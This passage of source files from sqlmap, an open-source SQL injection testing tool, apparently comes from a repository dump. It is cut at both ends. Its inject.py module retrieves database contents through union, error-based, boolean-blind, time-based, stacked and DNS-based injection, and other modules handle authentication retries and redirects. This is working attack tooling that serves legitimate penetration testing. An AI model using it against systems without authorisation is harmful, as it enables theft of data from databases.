   self._feedInfo(\"release\", attrs.get(\"release\"))\n            self._feedInfo(\"codename\", attrs.get(\"codename\"))\n\n            self._dbmsVersion = sanitizeStr(attrs.get(\"dbms_version\"))\n            self._techVersion = sanitizeStr(attrs.get(\"tech_version\"))\n            self._sp = sanitizeStr(attrs.get(\"sp\"))\n\n            if self._dbmsVersion and self._dbmsVersion.isdigit():\n                self._feedInfo(\"dbmsVersion\", self._match.group(int(self._dbmsVersion)))\n\n            if self._techVersion and self._techVersion.isdigit():\n                self._feedInfo(\"technology\", \"%s %s\" % (attrs.get(\"technology\"), self._match.group(int(self._techVersion))))\n            else:\n                self._feedInfo(\"technology\", attrs.get(\"technology\"))\n\n            if self._sp.isdigit():\n                self._feedInfo(\"sp\", \"Service Pack %s\" % int(self._sp))\n\n            self._regexp = None\n            self._match = None\n            self._dbmsVersion = None\n            self._techVersion = None\n", "lib/request/inject.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom __future__ import print_function\n\nimport re\nimport time\n\nfrom lib.core.agent import agent\nfrom lib.core.bigarray import BigArray\nfrom lib.core.common import applyFunctionRecursively\nfrom lib.core.common import Backend\nfrom lib.core.common import calculateDeltaSeconds\nfrom lib.core.common import cleanQuery\nfrom lib.core.common import expandAsteriskForColumns\nfrom lib.core.common import extractExpectedValue\nfrom lib.core.common import filterNone\nfrom lib.core.common import getPublicTypeMembers\nfrom lib.core.common import getTechnique\nfrom lib.core.common import getTechniqueData\nfrom lib.core.common import hashDBRetrieve\nfrom lib.core.common import hashDBWrite\nfrom lib.core.common import initTechnique\nfrom lib.core.common import isDigit\nfrom lib.core.common import isNoneValue\nfrom lib.core.common import isNumPosStrValue\nfrom lib.core.common import isTechniqueAvailable\nfrom lib.core.common import parseUnionPage\nfrom lib.core.common import popValue\nfrom lib.core.common import pushValue\nfrom lib.core.common import randomStr\nfrom lib.core.common import readInput\nfrom lib.core.common import setTechnique\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.compat import xrange\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.data import queries\nfrom lib.core.decorators import lockedmethod\nfrom lib.core.decorators import stackedmethod\nfrom lib.core.dicts import FROM_DUMMY_TABLE\nfrom lib.core.enums import CHARSET_TYPE\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import EXPECTED\nfrom lib.core.enums import PAYLOAD\nfrom lib.core.exception import SqlmapConnectionException\nfrom lib.core.exception import SqlmapDataException\nfrom lib.core.exception import SqlmapNotVulnerableException\nfrom lib.core.exception import SqlmapUserQuitException\nfrom lib.core.settings import GET_VALUE_UPPERCASE_KEYWORDS\nfrom lib.core.settings import INFERENCE_MARKER\nfrom lib.core.settings import MAX_TECHNIQUES_PER_VALUE\nfrom lib.core.settings import SQL_SCALAR_REGEX\nfrom lib.core.settings import UNICODE_ENCODING\nfrom lib.core.threads import getCurrentThreadData\nfrom lib.request.connect import Connect as Request\nfrom lib.request.direct import direct\nfrom lib.techniques.blind.inference import bisection\nfrom lib.techniques.blind.inference import queryOutputLength\nfrom lib.techniques.dns.test import dnsTest\nfrom lib.techniques.dns.use import dnsUse\nfrom lib.techniques.error.use import errorUse\nfrom lib.techniques.union.use import unionUse\nfrom thirdparty import six\n\ndef _goDns(payload, expression):\n    value = None\n\n    if conf.dnsDomain and kb.dnsTest is not False and not kb.testMode and Backend.getDbms() is not None:\n        if kb.dnsTest is None:\n            dnsTest(payload)\n\n        if kb.dnsTest:\n            value = dnsUse(payload, expression)\n\n    return value\n\ndef _goInference(payload, expression, charsetType=None, firstChar=None, lastChar=None, dump=False, field=None):\n    start = time.time()\n    value = None\n    count = 0\n\n    value = _goDns(payload, expression)\n\n    if payload is None:\n        return None\n\n    if value is not None:\n        return value\n\n    timeBasedCompare = (getTechnique() in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED))\n\n    if timeBasedCompare and conf.threads > 1 and kb.forceThreads is None:\n        msg = \"multi-threading is considered unsafe in \"\n        msg += \"time-based data retrieval. Are you sure \"\n        msg += \"of your choice (breaking warranty) [y/N] \"\n\n        kb.forceThreads = readInput(msg, default='N', boolean=True)\n\n    if not (timeBasedCompare and kb.dnsTest):\n        if (conf.eta or conf.threads > 1) and Backend.getIdentifiedDbms() and not re.search(r\"(COUNT|LTRIM)\\(\", expression, re.I) and not (timeBasedCompare and not kb.forceThreads):\n\n            if field and re.search(r\"\\ASELECT\\s+DISTINCT\\((.+?)\\)\\s+FROM\", expression, re.I):\n                if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL, DBMS.MONETDB, DBMS.VERTICA, DBMS.CRATEDB, DBMS.CUBRID):\n                    alias = randomStr(lowercase=True, seed=hash(expression))\n                    expression = \"SELECT %s FROM (%s)\" % (field if '.' not in field else re.sub(r\".+\\.\", \"%s.\" % alias, field), expression)  # Note: MonetDB as a prime example\n                    expression += \" AS %s\" % alias\n                else:\n                    expression = \"SELECT %s FROM (%s)\" % (field, expression)\n\n            if field and conf.hexConvert or conf.binaryFields and field in conf.binaryFields or Backend.getIdentifiedDbms() in (DBMS.RAIMA,):\n                nulledCastedField = agent.nullAndCastField(field)\n                injExpression = expression.replace(field, nulledCastedField, 1)\n            else:\n                injExpression = expression\n            length = queryOutputLength(injExpression, payload)\n        else:\n            length = None\n\n        kb.inferenceMode = True\n        count, value = bisection(payload, expression, length, charsetType, firstChar, lastChar, dump)\n        kb.inferenceMode = False\n\n        if not kb.bruteMode:\n            debugMsg = \"performed %d quer%s in %.2f seconds\" % (count, 'y' if count == 1 else \"ies\", calculateDeltaSeconds(start))\n            logger.debug(debugMsg)\n\n    return value\n\ndef _goInferenceFields(expression, expressionFields, expressionFieldsList, payload, num=None, charsetType=None, firstChar=None, lastChar=None, dump=False):\n    outputs = []\n    origExpr = None\n\n    for field in expressionFieldsList:\n        output = None\n\n        if field.startswith(\"ROWNUM \"):\n            continue\n\n        if isinstance(num, int):\n            origExpr = expression\n            expression = agent.limitQuery(num, expression, field, expressionFieldsList[0])\n\n        if \"ROWNUM\" in expressionFieldsList:\n            expressionReplaced = expression\n        else:\n            expressionReplaced = expression.replace(expressionFields, field, 1)\n\n        output = _goInference(payload, expressionReplaced, charsetType, firstChar, lastChar, dump, field)\n\n        if isinstance(num, int):\n            expression = origExpr\n\n        outputs.append(output)\n\n    return outputs\n\ndef _goInferenceProxy(expression, fromUser=False, batch=False, unpack=True, charsetType=None, firstChar=None, lastChar=None, dump=False):\n    \"\"\"\n    Retrieve the output of a SQL query characted by character taking\n    advantage of an blind SQL injection vulnerability on the affected\n    parameter through a bisection algorithm.\n    \"\"\"\n\n    initTechnique(getTechnique())\n\n    query = agent.prefixQuery(getTechniqueData().vector)\n    query = agent.suffixQuery(query)\n    payload = agent.payload(newValue=query)\n    count = None\n    startLimit = 0\n    stopLimit = None\n    outputs = BigArray()\n\n    if not unpack:\n        return _goInference(payload, expression, charsetType, firstChar, lastChar, dump)\n\n    _, _, _, _, _, expressionFieldsList, expressionFields, _ = agent.getFields(expression)\n\n    rdbRegExp = re.search(r\"RDB\\$GET_CONTEXT\\([^)]+\\)\", expression, re.I)\n    if rdbRegExp and Backend.isDbms(DBMS.FIREBIRD):\n        expressionFieldsList = [expressionFields]\n\n    if len(expressionFieldsList) > 1:\n        infoMsg = \"the SQL query provided has more than one field. \"\n        infoMsg += \"sqlmap will now unpack it into distinct queries \"\n        infoMsg += \"to be able to retrieve the output even if we \"\n        infoMsg += \"are going blind\"\n        logger.info(infoMsg)\n\n    # If we have been here from SQL query/shell we have to check if\n    # the SQL query might return multiple entries and in such case\n    # forge the SQL limiting the query output one entry at a time\n    # NOTE: we assume that only queries that get data from a table\n    # can return multiple entries\n    if fromUser and \" FROM \" in expression.upper() and ((Backend.getIdentifiedDbms() not in FROM_DUMMY_TABLE) or (Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and not expression.upper().endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]))) and not re.search(SQL_SCALAR_REGEX, expression, re.I) and hasattr(queries[Backend.getIdentifiedDbms()].limitregexp, \"query\"):\n        expression, limitCond, topLimit, startLimit, stopLimit = agent.limitCondition(expression)\n\n        if limitCond:\n            test = True\n\n            if not stopLimit or stopLimit <= 1:\n                if Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and expression.upper().endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]):\n                    test = False\n\n            if test:\n                # Count the number of SQL query entries output\n                countFirstField = queries[Backend.getIdentifiedDbms()].count.query % expressionFieldsList[0]\n                countedExpression = expression.replace(expressionFields, countFirstField, 1)\n\n                if \" ORDER BY \" in countedExpression.upper():\n                    _ = countedExpression.upper().rindex(\" ORDER BY \")\n                    countedExpression = countedExpression[:_]\n\n                if not stopLimit:\n                    count = _goInference(payload, countedExpression, charsetType=CHARSET_TYPE.DIGITS, firstChar=firstChar, lastChar=lastChar)\n\n                    if isNumPosStrValue(count):\n                        count = int(count)\n\n                        if batch or count == 1:\n                            stopLimit = count\n                        else:\n                            message = \"the SQL query provided can return \"\n                            message += \"%d entries. How many \" % count\n                            message += \"entries do you want to retrieve?\\n\"\n                            message += \"[a] All (default)\\n[#] Specific number\\n\"\n                            message += \"[q] Quit\"\n                            choice = readInput(message, default='A').upper()\n\n                            if choice == 'A':\n                                stopLimit = count\n\n                            elif choice == 'Q':\n                                raise SqlmapUserQuitException\n\n                            elif isDigit(choice) and int(choice) > 0 and int(choice) <= count:\n                                stopLimit = int(choice)\n\n                                infoMsg = \"sqlmap is now going to retrieve the \"\n                                infoMsg += \"first %d query output entries\" % stopLimit\n                                logger.info(infoMsg)\n\n                            elif choice in ('#', 'S'):\n                                message = \"how many? \"\n                                stopLimit = readInput(message, default=\"10\")\n\n                                if not isDigit(stopLimit):\n                                    errMsg = \"invalid choice\"\n                                    logger.error(errMsg)\n\n                                    return None\n\n                                else:\n                                    stopLimit = int(stopLimit)\n\n                            else:\n                                errMsg = \"invalid choice\"\n                                logger.error(errMsg)\n\n                                return None\n\n                    elif count and not isDigit(count):\n                        warnMsg = \"it was not possible to count the number \"\n                        warnMsg += \"of entries for the SQL query provided. \"\n                        warnMsg += \"sqlmap will assume that it returns only \"\n                        warnMsg += \"one entry\"\n                        logger.warning(warnMsg)\n\n                        stopLimit = 1\n\n                    elif not isNumPosStrValue(count):\n                        if not count:\n                            warnMsg = \"the SQL query provided does not \"\n                            warnMsg += \"return any output\"\n                            logger.warning(warnMsg)\n\n                        return None\n\n                elif (not stopLimit or stopLimit == 0):\n                    return None\n\n                try:\n                    try:\n                        for num in xrange(startLimit or 0, stopLimit or 0):\n                            output = _goInferenceFields(expression, expressionFields, expressionFieldsList, payload, num=num, charsetType=charsetType, firstChar=firstChar, lastChar=lastChar, dump=dump)\n                            outputs.append(output)\n                    except OverflowError:\n                        errMsg = \"boundary limits (%d,%d) are too large. Please rerun \" % (startLimit, stopLimit)\n                        errMsg += \"with switch '--fresh-queries'\"\n                        raise SqlmapDataException(errMsg)\n\n                except KeyboardInterrupt:\n                    print()\n                    warnMsg = \"user aborted during dumping phase\"\n                    logger.warning(warnMsg)\n\n                return outputs\n\n    elif Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and expression.upper().startswith(\"SELECT \") and \" FROM \" not in expression.upper():\n        expression += FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]\n\n    outputs = _goInferenceFields(expression, expressionFields, expressionFieldsList, payload, charsetType=charsetType, firstChar=firstChar, lastChar=lastChar, dump=dump)\n\n    return \", \".join(output or \"\" for output in outputs) if not isNoneValue(outputs) else None\n\ndef _goBooleanProxy(expression):\n    \"\"\"\n    Retrieve the output of a boolean based SQL query\n    \"\"\"\n\n    initTechnique(getTechnique())\n\n    if conf.dnsDomain:\n        query = agent.prefixQuery(getTechniqueData().vector)\n        query = agent.suffixQuery(query)\n        payload = agent.payload(newValue=query)\n        output = _goDns(payload, expression)\n\n        if output is not None:\n            return output\n\n    vector = getTechniqueData().vector\n    vector = vector.replace(INFERENCE_MARKER, expression)\n    query = agent.prefixQuery(vector)\n    query = agent.suffixQuery(query)\n    payload = agent.payload(newValue=query)\n\n    timeBasedCompare = getTechnique() in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED)\n\n    output = hashDBRetrieve(expression, checkConf=True)\n\n    if output is None:\n        output = Request.queryPage(payload, timeBasedCompare=timeBasedCompare, raise404=False)\n\n        if output is not None:\n            hashDBWrite(expression, output)\n\n    return output\n\ndef _goUnion(expression, unpack=True, dump=False):\n    \"\"\"\n    Retrieve the output of a SQL query taking advantage of an union SQL\n    injection vulnerability on the affected parameter.\n    \"\"\"\n\n    output = unionUse(expression, unpack=unpack, dump=dump)\n\n    if isinstance(output, six.string_types):\n        output = parseUnionPage(output)\n\n    return output\n\n@lockedmethod\n@stackedmethod\ndef getValue(expression, blind=True, union=True, error=True, time=True, fromUser=False, expected=None, batch=False, unpack=True, resumeValue=True, charsetType=None, firstChar=None, lastChar=None, dump=False, suppressOutput=None, expectingNone=False, safeCharEncode=True):\n    \"\"\"\n    Called each time sqlmap inject a SQL query on the SQL injection\n    affected parameter.\n    \"\"\"\n\n    if conf.hexConvert and expected != EXPECTED.BOOL and Backend.getIdentifiedDbms():\n        if not hasattr(queries[Backend.getIdentifiedDbms()], \"hex\"):\n            warnMsg = \"switch '--hex' is currently not supported on DBMS %s\" % Backend.getIdentifiedDbms()\n            singleTimeWarnMessage(warnMsg)\n            conf.hexConvert = False\n        else:\n            charsetType = CHARSET_TYPE.HEXADECIMAL\n\n    kb.safeCharEncode = safeCharEncode\n    kb.resumeValues = resumeValue\n\n    for keyword in GET_VALUE_UPPERCASE_KEYWORDS:\n        expression = re.sub(r\"(?i)(\\A|\\(|\\)|\\s)%s(\\Z|\\(|\\)|\\s)\" % keyword, r\"\\g<1>%s\\g<2>\" % keyword, expression)\n\n    if suppressOutput is not None:\n        pushValue(getCurrentThreadData().disableStdOut)\n        getCurrentThreadData().disableStdOut = suppressOutput\n\n    try:\n        pushValue(conf.db)\n        pushValue(conf.tbl)\n\n        if expected == EXPECTED.BOOL:\n            forgeCaseExpression = booleanExpression = expression\n\n            if expression.startswith(\"SELECT \"):\n                booleanExpression = \"(%s)=%s\" % (booleanExpression, \"'1'\" if \"'1'\" in booleanExpression else \"1\")\n            else:\n                forgeCaseExpression = agent.forgeCaseStatement(expression)\n\n        if conf.direct:\n            value = direct(forgeCaseExpression if expected == EXPECTED.BOOL else expression)\n\n        elif any(isTechniqueAvailable(_) for _ in getPublicTypeMembers(PAYLOAD.TECHNIQUE, onlyValues=True)):\n            query = cleanQuery(expression)\n            query = expandAsteriskForColumns(query)\n            value = None\n            found = False\n            count = 0\n\n            if query and not re.search(r\"COUNT.*FROM.*\\(.*DISTINCT\", query, re.I):\n                query = query.replace(\"DISTINCT \", \"\")\n\n            if not conf.forceDns:\n                if union and isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):\n                    setTechnique(PAYLOAD.TECHNIQUE.UNION)\n                    kb.forcePartialUnion = kb.injection.data[PAYLOAD.TECHNIQUE.UNION].vector[8]\n                    fallback = not expected and kb.injection.data[PAYLOAD.TECHNIQUE.UNION].where == PAYLOAD.WHERE.ORIGINAL and not kb.forcePartialUnion\n\n                    if expected == EXPECTED.BOOL:\n                        # Note: some DBMSes (e.g. Altibase) don't support implicit conversion of boolean check result during concatenation with prefix and suffix (e.g. 'qjjvq'||(1=1)||'qbbbq')\n\n                        if not any(_ in forgeCaseExpression for _ in (\"SELECT\", \"CASE\")):\n                            forgeCaseExpression = \"(CASE WHEN (%s) THEN '1' ELSE '0' END)\" % forgeCaseExpression\n\n                    try:\n                        value = _goUnion(forgeCaseExpression if expected == EXPECTED.BOOL else query, unpack, dump)\n                    except SqlmapConnectionException:\n                        if not fallback:\n                            raise\n\n                    count += 1\n                    found = (value is not None) or (value is None and expectingNone) or count >= MAX_TECHNIQUES_PER_VALUE\n\n                    if not found and fallback:\n                        warnMsg = \"something went wrong with full UNION \"\n                        warnMsg += \"technique (could be because of \"\n                        warnMsg += \"limitation on retrieved number of entries)\"\n                        if \" FROM \" in query.upper():\n                            warnMsg += \". Falling back to partial UNION technique\"\n                            singleTimeWarnMessage(warnMsg)\n\n                            try:\n                                pushValue(kb.forcePartialUnion)\n                                kb.forcePartialUnion = True\n                                value = _goUnion(query, unpack, dump)\n                                found = (value is not None) or (value is None and expectingNone)\n                            finally:\n                                kb.forcePartialUnion = popValue()\n                        else:\n                            singleTimeWarnMessage(warnMsg)\n\n                if error and any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) and not found:\n                    setTechnique(PAYLOAD.TECHNIQUE.ERROR if isTechniqueAvailable(PAYLOAD.TECHNIQUE.ERROR) else PAYLOAD.TECHNIQUE.QUERY)\n                    value = errorUse(forgeCaseExpression if expected == EXPECTED.BOOL else query, dump)\n                    count += 1\n                    found = (value is not None) or (value is None and expectingNone) or count >= MAX_TECHNIQUES_PER_VALUE\n\n                if found and conf.dnsDomain:\n                    _ = \"\".join(filterNone(key if isTechniqueAvailable(value) else None for key, value in {'E': PAYLOAD.TECHNIQUE.ERROR, 'Q': PAYLOAD.TECHNIQUE.QUERY, 'U': PAYLOAD.TECHNIQUE.UNION}.items()))\n                    warnMsg = \"option '--dns-domain' will be ignored \"\n                    warnMsg += \"as faster techniques are usable \"\n                    warnMsg += \"(%s) \" % _\n                    singleTimeWarnMessage(warnMsg)\n\n            if blind and isTechniqueAvailable(PAYLOAD.TECHNIQUE.BOOLEAN) and not found:\n                setTechnique(PAYLOAD.TECHNIQUE.BOOLEAN)\n\n                if expected == EXPECTED.BOOL:\n                    value = _goBooleanProxy(booleanExpression)\n                else:\n                    value = _goInferenceProxy(query, fromUser, batch, unpack, charsetType, firstChar, lastChar, dump)\n\n                count += 1\n                found = (value is not None) or (value is None and expectingNone) or count >= MAX_TECHNIQUES_PER_VALUE\n\n            if time and (isTechniqueAvailable(PAYLOAD.TECHNIQUE.TIME) or isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED)) and not found:\n                match = re.search(r\"\\bFROM\\b ([^ ]+).+ORDER BY ([^ ]+)\", expression)\n                kb.responseTimeMode = \"%s|%s\" % (match.group(1), match.group(2)) if match else None\n\n                if isTechniqueAvailable(PAYLOAD.TECHNIQUE.TIME):\n                    setTechnique(PAYLOAD.TECHNIQUE.TIME)\n                else:\n                    setTechnique(PAYLOAD.TECHNIQUE.STACKED)\n\n                if expected == EXPECTED.BOOL:\n                    value = _goBooleanProxy(booleanExpression)\n                else:\n                    value = _goInferenceProxy(query, fromUser, batch, unpack, charsetType, firstChar, lastChar, dump)\n        else:\n            errMsg = \"none of the injection types identified can be \"\n            errMsg += \"leveraged to retrieve queries output\"\n            raise SqlmapNotVulnerableException(errMsg)\n\n    finally:\n        kb.resumeValues = True\n        kb.responseTimeMode = None\n\n        conf.tbl = popValue()\n        conf.db = popValue()\n\n        if suppressOutput is not None:\n            getCurrentThreadData().disableStdOut = popValue()\n\n    kb.safeCharEncode = False\n\n    if not any((kb.testMode, conf.dummy, conf.offline, conf.noCast, conf.hexConvert)) and value is None and Backend.getDbms() and conf.dbmsHandler and kb.fingerprinted:\n        if conf.abortOnEmpty:\n            errMsg = \"aborting due to empty data retrieval\"\n            logger.critical(errMsg)\n            raise SystemExit\n        else:\n            warnMsg = \"in case of continuous data retrieval problems you are advised to try \"\n            warnMsg += \"a switch '--no-cast' \"\n            warnMsg += \"or switch '--hex'\" if hasattr(queries[Backend.getIdentifiedDbms()], \"hex\") else \"\"\n            singleTimeWarnMessage(warnMsg)\n\n    # Dirty patch (MSSQL --binary-fields with 0x31003200...)\n    if Backend.isDbms(DBMS.MSSQL) and conf.binaryFields:\n        def _(value):\n            if isinstance(value, six.text_type):\n                if value.startswith(u\"0x\"):\n                    value = value[2:]\n                    if value and len(value) % 4 == 0:\n                        candidate = \"\"\n                        for i in xrange(len(value)):\n                            if i % 4 < 2:\n                                candidate += value[i]\n                            elif value[i] != '0':\n                                candidate = None\n                                break\n                        if candidate:\n                            value = candidate\n            return value\n\n        value = applyFunctionRecursively(value, _)\n\n    # Dirty patch (safe-encoded unicode characters)\n    if isinstance(value, six.text_type) and \"\\\\x\" in value:\n        try:\n            candidate = eval(repr(value).replace(\"\\\\\\\\x\", \"\\\\x\").replace(\"u'\", \"'\", 1)).decode(conf.encoding or UNICODE_ENCODING)\n            if \"\\\\x\" not in candidate:\n                value = candidate\n        except:\n            pass\n\n    return extractExpectedValue(value, expected)\n\ndef goStacked(expression, silent=False):\n    if PAYLOAD.TECHNIQUE.STACKED in kb.injection.data:\n        setTechnique(PAYLOAD.TECHNIQUE.STACKED)\n    else:\n        for technique in getPublicTypeMembers(PAYLOAD.TECHNIQUE, True):\n            _ = getTechniqueData(technique)\n            if _ and \"stacked\" in _[\"title\"].lower():\n                setTechnique(technique)\n                break\n\n    expression = cleanQuery(expression)\n\n    if conf.direct:\n        return direct(expression)\n\n    query = agent.prefixQuery(\";%s\" % expression)\n    query = agent.suffixQuery(query)\n    payload = agent.payload(newValue=query)\n    Request.queryPage(payload, content=False, silent=silent, noteResponseTime=False, timeBasedCompare=\"SELECT\" in (payload or \"\").upper())\n\ndef checkBooleanExpression(expression, expectingNone=True):\n    return getValue(expression, expected=EXPECTED.BOOL, charsetType=CHARSET_TYPE.BINARY, suppressOutput=True, expectingNone=expectingNone)\n", "lib/request/basicauthhandler.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom thirdparty.six.moves import urllib as _urllib\n\nclass SmartHTTPBasicAuthHandler(_urllib.request.HTTPBasicAuthHandler):\n    \"\"\"\n    Reference: http://selenic.com/hg/rev/6c51a5056020\n    Fix for a: http://bugs.python.org/issue8797\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        _urllib.request.HTTPBasicAuthHandler.__init__(self, *args, **kwargs)\n        self.retried_req = set()\n        self.retried_count = 0\n\n    def reset_retry_count(self):\n        # Python 2.6.5 will call this on 401 or 407 errors and thus loop\n        # forever. We disable reset_retry_count completely and reset in\n        # http_error_auth_reqed instead.\n        pass\n\n    def http_error_auth_reqed(self, auth_header, host, req, headers):\n        # Reset the retry counter once for each request.\n        if hash(req) not in self.retried_req:\n            self.retried_req.add(hash(req))\n            self.retried_count = 0\n        else:\n            if self.retried_count > 5:\n                raise _urllib.error.HTTPError(req.get_full_url(), 401, \"basic auth failed\", headers, None)\n            else:\n                self.retried_count += 1\n\n        return _urllib.request.HTTPBasicAuthHandler.http_error_auth_reqed(self, auth_header, host, req, headers)\n", "lib/request/redirecthandler.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport io\nimport re\nimport time\nimport types\n\nfrom lib.core.common import getHostHeader\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import logHTTPTraffic\nfrom lib.core.common import readInput\nfrom lib.core.convert import getBytes\nfrom lib.core.convert import getUnicode\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import CUSTOM_LOGGING\nfrom lib.core.enums import HTTP_HEADER\nfrom lib.core.enums import HTTPMETHOD\nfrom lib.core.enums import REDIRECTION\nfrom lib.core.exception import SqlmapConnectionException\nfrom lib.core.settings import DEFAULT_COOKIE_DELIMITER\nfrom lib.core.settings import MAX_CONNECTION_READ_SIZE\nfrom lib.core.settings import MAX_CONNECTION_TOTAL_SIZE\nfrom lib.core.settings import MAX_SINGLE_URL_REDIRECTIONS\nfrom lib.core.settings import MAX_TOTAL_REDIRECTIONS\nfrom lib.core.threads import getCurrentThreadData\nfrom lib.request.basic import decodePage\nfrom lib.request.basic import parseResponse\nfrom thirdparty import six\nfrom thirdparty.six.moves import urllib as _urllib\n\nclass SmartRedirectHandler(_urllib.request.HTTPRedirectHandler):\n    def _get_header_redirect(self, headers):\n        retVal = None\n\n        if headers:\n            if HTTP_HEADER.LOCATION in headers:\n                retVal = headers[HTTP_HEADER.LOCATION]\n            elif HTTP_HEADER.URI in headers:\n                retVal = headers[HTTP_HEADER.URI]\n\n        return retVal\n\n    def _ask_redirect_choice(self, redcode, redurl, method):\n        with kb.locks.redirect:\n            if kb.choices.redirect is None:\n                msg = \"got a %d redirect to \" % redcode\n                msg += \"'%s'. Do you want to follow? [Y/n] \" % redurl\n\n                kb.choices.redirect = REDIRECTION.YES if readInput(msg, default='Y', boolean=True) else REDIRECTION.NO\n\n            if kb.choices.redirect == REDIRECTION.YES and method == HTTPMETHOD.POST and kb.resendPostOnRedirect is None:\n                msg = \"redirect is a result of a \"\n                msg += \"POST request. Do you want to \"\n                msg += \"resend original POST data to a new \"\n                msg += \"location? [%s] \" % (\"Y/n\" if not kb.originalPage else \"y/N\")\n\n                kb.resendPostOnRedirect = readInput(msg, default=('Y' if not kb.originalPage else 'N'), boolean=True)\n\n            if kb.resendPostOnRedirect:\n                self.redirect_request = self._redirect_request\n\n    def _redirect_request(self, req, fp, code, msg, headers, newurl):\n        return _urllib.request.Request(newurl.replace(' ', '%20'), data=req.data, headers=req.headers, origin_req_host=req.get_origin_req_host() if hasattr(req, \"get_origin_req_host\") else req.origin_req_host)\n\n    def http_error_302(self, req, fp, code, msg, headers):\n        start = time.time()\n        content = None\n        forceRedirect = False\n        redurl = self._get_header_redirect(headers) if not conf.ignoreRedirects else None\n\n        try:\n            content = fp.read(MAX_CONNECTION_TOTAL_SIZE)\n        except:  # e.g. IncompleteRead\n            content = b\"\"\n        finally:\n            if content:\n                try:  # try to write it back to the read buffer so we could reuse it in further steps\n                    fp.fp._rbuf.truncate(0)\n                    fp.fp._rbuf.write(content)\n                except:\n                    pass\n\n        content = decodePage(content, headers.get(HTTP_HEADER.CONTENT_ENCODING), headers.get(HTTP_HEADER.CONTENT_TYPE))\n\n        threadData = getCurrentThreadData()\n        threadData.lastRedirectMsg = (threadData.lastRequestUID, content)\n\n        redirectMsg = \"HTTP redirect \"\n        redirectMsg += \"[#%d] (%d %s):\\r\\n\" % (threadData.lastRequestUID, code, getUnicode(msg))\n\n        if headers:\n            logHeaders = \"\\r\\n\".join(\"%s: %s\" % (getUnicode(key.capitalize() if hasattr(key, \"capitalize\") else key), getUnicode(value)) for (key, value) in headers.items())\n        else:\n            logHeaders = \"\"\n\n        redirectMsg += logHeaders\n        if content:\n            redirectMsg += \"\\r\\n\\r\\n%s\" % getUnicode(content[:MAX_CONNECTION_READ_SIZE])\n\n        logHTTPTraffic(threadData.lastRequestMsg, redirectMsg, start, time.time())\n        logger.log(CUSTOM_LOGGING.TRAFFIC_IN, redirectMsg)\n\n        if redurl:\n            try:\n                if not _urllib.parse.urlsplit(redurl).netloc:\n                    redurl = _urllib.parse.urljoin(req.get_full_url(), redurl)\n\n                self._infinite_loop_check(req)\n                if conf.scope:\n                    if not re.search(conf.scope, redurl, re.I):\n                        redurl = None\n                    else:\n                        forceRedirect = True\n                else:\n                    self._ask_redirect_choice(code, redurl, req.get_method())\n            except ValueError:\n                redurl = None\n                result = fp\n\n        if redurl and (kb.choices.redirect == REDIRECTION.YES or forceRedirect):\n            parseResponse(content, headers)\n\n            req.headers[HTTP_HEADER.HOST] = getHostHeader(redurl)\n            if headers and HTTP_HEADER.SET_COOKIE in headers:\n                cookies = dict()\n                delimiter = conf.cookieDel or DEFAULT_COOKIE_DELIMITER\n                last = None\n\n                for part in getUnicode(req.headers.get(HTTP_HEADER.COOKIE, \"\")).split(delimiter) + ([headers[HTTP_HEADER.SET_COOKIE]] if HTTP_HEADER.SET_COOKIE in headers else []):\n                    if '=' in part:\n                        part = part.strip()\n                        key, value = part.split('=', 1)\n                        cookies[key] = value\n                        last = key\n                    elif last:\n                        cookies[last] += \"%s%s\" % (delimiter, part)\n\n                req.headers[HTTP_HEADER.COOKIE] = delimiter.join(\"%s=%s\" % (key, cookies[key]) for key in cookies)\n\n            try:\n                result = _urllib.request.HTTPRedirectHandler.http_error_302(self, req, fp, code, msg, headers)\n            except _urllib.error.HTTPError as ex:\n                result = ex\n\n                # Dirty hack for https://github.com/sqlmapproject/sqlmap/issues/4046\n                try:\n                    hasattr(result, \"read\")\n                except KeyError:\n                    class _(object):\n                        pass\n                    result = _()\n\n                # Dirty hack for http://bugs.python.org/issue15701\n                try:\n                    result.info()\n                except AttributeError:\n                    def _(self):\n                        return getattr(self, \"hdrs\", {})\n\n                    result.info = types.MethodType(_, result)\n\n                if not hasattr(result, \"read\"):\n                    def _(self, length=None):\n                        try:\n                            retVal = getSafeExString(ex)        # Note: pyflakes mistakenly marks 'ex' as undefined (NOTE: tested in both Python2 and Python3)\n                        except:\n                            retVal = \"\"\n                        return getBytes(retVal)\n\n                    result.read = types.MethodType(_, result)\n\n                if not getattr(result, \"url\", None):\n                    result.url = redurl\n\n                if not getattr(result, \"code\", None):\n                    result.code = 999\n            except:\n                redurl = None\n                result = fp\n                fp.read = io.BytesIO(b\"\").read\n        else:\n            result = fp\n\n        threadData.lastRedirectURL = (threadData.lastRequestUID, redurl)\n\n        result.redcode = code\n        result.redurl = getUnicode(redurl) if six.PY3 else redurl\n        return result\n\n    http_error_301 = http_error_303 = http_error_307 = http_error_302\n\n    def _infinite_loop_check(self, req):\n        if hasattr(req, 'redirect_dict') and 